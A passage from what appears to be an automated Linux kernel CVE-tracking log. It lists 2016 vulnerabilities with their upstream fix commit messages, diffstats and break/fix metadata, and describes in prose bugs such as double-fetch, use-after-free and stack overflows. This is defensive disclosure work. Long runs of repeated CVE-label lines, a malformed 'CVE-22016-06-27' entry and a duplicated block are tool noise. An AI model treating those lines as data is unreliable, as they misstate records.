    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
